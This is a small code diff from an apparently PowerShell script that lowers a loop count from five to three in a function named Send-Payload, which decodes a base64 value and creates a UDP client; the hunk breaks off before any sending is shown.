@@ -11,7 +11,7 @@ function Send-Payload {
         [int]$port
     )
 
-    for ($i = 0; $i -lt 5; $i++) {
+    for ($i = 0; $i -lt 3; $i++) {
         $udpClient = New-Object System.Net.Sockets.UdpClient
         $bytes = [System.Convert]::FromBase64String($payload)
         try {
